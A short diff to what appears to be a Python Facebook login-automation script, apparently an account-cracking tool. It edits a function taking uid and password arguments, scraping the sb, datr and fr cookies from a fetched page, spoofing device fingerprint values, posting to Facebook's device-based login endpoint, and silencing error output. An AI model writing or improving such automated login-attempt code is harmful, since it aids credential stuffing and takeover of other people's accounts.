@@ -1154,8 +1154,16 @@ def mobile(uid,pwx,tl):
             '__fmt': '0',
             '__a': '',
             '__user': '0',}
-            koki = (";").join([ "%s=%s" % (key, value) for key, value in free_fb.cookies.get_dict().items() ])
-            print(koki)
+            cookies = {
+            'ps_l': '1',
+            'ps_n': '1',
+            'sb': re.search('name="sb" value="(.*?)"', str(free_fb)).group(1),
+            'datr': re.search('name="datr" value="(.*?)"', str(free_fb)).group(1),
+            'dpr': '2.418783187866211',
+            'm_pixel_ratio': '2.200000047683716',
+            'wd': '491x968',
+            'fr': re.search('name="fr" value="(.*?)"', str(free_fb)).group(1),}
+            print(cookies)
             headers = {"authority": "www.facebook.com",
             "method": "POST",
             "path": "/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100",
@@ -1224,7 +1232,7 @@ def mobile(uid,pwx,tl):
     except ce:
         time.sleep(20)
     except Exception as error:
-        print({error})
+        #print({error})
         pass
 
 def freeq(uid,pwx,tl):
